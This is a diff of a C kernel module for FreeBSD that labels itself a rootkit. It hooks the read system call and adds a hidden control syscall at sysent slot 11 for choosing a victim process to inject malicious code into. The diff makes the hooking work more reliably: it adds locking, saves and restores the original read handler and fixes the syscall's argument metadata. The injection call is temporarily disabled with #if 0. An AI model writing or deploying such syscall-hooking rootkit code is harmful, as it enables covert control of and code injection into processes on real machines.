@@ -19,12 +19,15 @@
 #include <sys/param.h>
 #include <sys/module.h>
 #include <sys/mman.h>
+#include <sys/lock.h>
+#include <sys/mutex.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
 #include <sys/proc.h>
 #include <sys/sysent.h>
 #include <sys/syscall.h>
 #include <sys/sysproto.h>
+#include <sys/sx.h>
 
 //
 // Design:
@@ -39,6 +42,9 @@ struct proc * victimProc = 0;
 
 // Flags whether malicous code has been injected
 unsigned char injected = 0;
+
+// Previous system call
+void * oldRead;
 
 //
 // Function: isVictimThread()
@@ -94,7 +100,7 @@ insertMaliciousCode (struct thread * td) {
 //  control the rootkit.  It provides services such as configuring the victim
 //  process to attack.
 //
-static void
+static int
 command_hook (struct thread * td, void * syscall_args) {
   // System call arguments
   struct config_args {
@@ -105,11 +111,21 @@ command_hook (struct thread * td, void * syscall_args) {
   // Find the victim process that we want to attack.  A victim PID of zero
   // mean that we don't want to attack any process.
   //
+  // Note that pfind() locks the process, so we want to unlock it.
+  //
   struct config_args * argsp = (struct config_args *)(syscall_args);
-  printf ("rootkit: Looking for process %d\n", argsp->victimPID);
-  victimProc = (argsp->victimPID) ?  pfind (argsp->victimPID) : 0;
+  pid_t victimPID = argsp->victimPID;
+  printf ("rootkit: Looking for process %d\n", victimPID);
+
+  sx_slock(&allproc_lock);
+  LIST_FOREACH(victimProc, PIDHASH(victimPID), p_hash)
+  if (victimProc->p_pid == victimPID) {
+    break;
+  }
+  sx_sunlock(&allproc_lock);
+
   printf ("rootkit: Victim process %p\n", victimProc);
-  return;
+  return 0;
 }
 
 //
@@ -133,8 +149,10 @@ read_hook (struct thread * td, void * syscall_args) {
   // If this is the victim process, and we have not injected code yet,
   // inject the code.
   //
+#if 0
   if (isVictimThread (td))
     insertMaliciousCode (td);
+#endif
   return bytesRead;
 }
 
@@ -142,8 +160,11 @@ static void
 initializeRootkit (void) {
   // Add a system call to control the rootkit
   sysent[11].sy_call = (sy_call_t *) command_hook;
+  sysent[11].sy_narg = 1;
+  sysent[11].sy_thrcnt = SY_THR_STATIC;
 
   // Intercept the read system call
+  oldRead = sysent[SYS_read].sy_call;
   sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
 }
 
@@ -152,7 +173,7 @@ unloadRootkit (void) {
   //
   // Restore all hooked system calls.
   //
-  sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
+  sysent[SYS_read].sy_call = (sy_call_t *) oldRead;
   sysent[11].sy_call = (sy_call_t *) nosys;
 }
 
